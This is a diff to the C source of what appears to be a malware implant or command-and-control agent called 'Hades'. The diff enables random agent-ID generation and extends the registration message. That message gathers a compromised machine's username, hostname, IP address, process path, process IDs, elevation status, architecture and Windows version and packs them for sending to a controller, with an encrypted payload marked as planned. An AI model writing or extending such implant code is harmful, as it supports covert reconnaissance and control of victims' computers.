@@ -20,11 +20,11 @@ BOOL GetVer(DWORD* major, DWORD* minor, DWORD* build) {
 }
 
 
-// ULONG GenID() {
-// 	ULONG S = hades->WinApis.GetTickCount();
-// 	ULONG id = hades->NtApis.RtlRandomEx(&S);
-// 	return id;
-// }
+ ULONG GenID() {
+ 	ULONG S = hades->WinApis.GetTickCount();
+ 	ULONG id = hades->NtApis.RtlRandomEx(&S);
+ 	return id;
+ }
 
 
 PBYTE CollectProcessPath(DWORD* out) {
@@ -160,6 +160,7 @@ BOOL InitAgent() {
 	DWORD UserLen, HostLen, DomainLen, ProcessPathLen, IpLen, Major, Minor, Build;;
 
 
+	hades->config->HadesID = GenID();
 	PBYTE User = CollectUser(&UserLen);
 	PBYTE Host = CollectHost(&HostLen);
 	PBYTE ProcessPath = CollectProcessPath(&ProcessPathLen);
@@ -178,25 +179,30 @@ BOOL InitAgent() {
 
 	/*
 		[MSG TYPE]		  4 BYTES
+		[Reg ID]          4 BYTES
+		[ENCRYPTED PYALOAD [ // soon
 		[HADES ID]		  4 BYTES
-		[UserLen]         4 BYTES
-		[Username]		  N BYTES
-		[HostLen]		  4 BYTES
-		[Hostname]		  N BYTES
-		[IP LEN]		  4 BYTES
-		[IP STR]		  N BYTES
-		[ProcessPath Len] 4 BYTES
-		[PROCESS PATH]    N BYTES
-		[PID]			  4 BYTES
-		[TID]			  4 BYTES
-		[PPID]			  4 BYTES
-		[IsElev]		  1 BYTES
-		[Arch]			  1 BYTES
-		[Minor]			  4 BYTES
-		[Major]			  4 BYTES
-		[Build]			  4 BYTES*/
+			[UserLen]         4 BYTES
+			[Username]		  N BYTES
+			[HostLen]		  4 BYTES
+			[Hostname]		  N BYTES
+			[IP LEN]		  4 BYTES
+			[IP STR]		  N BYTES
+			[ProcessPath Len] 4 BYTES
+			[PROCESS PATH]    N BYTES
+			[PID]			  4 BYTES
+			[TID]			  4 BYTES
+			[PPID]			  4 BYTES
+			[IsElev]		  1 BYTES
+			[Arch]			  1 BYTES
+			[Minor]			  4 BYTES
+			[Major]			  4 BYTES
+			[Build]			  4 BYTES
+		]
+		*/
 	g_ByteMgr->InitWrite();
 	g_ByteMgr->Write4(MSG_REGISTER);
+	g_ByteMgr->Write4(hades->config->RegisterID);
 	g_ByteMgr->Write4(hades->config->HadesID);
 	g_ByteMgr->Write4(UserLen);
 	g_ByteMgr->WriteString(User, UserLen);
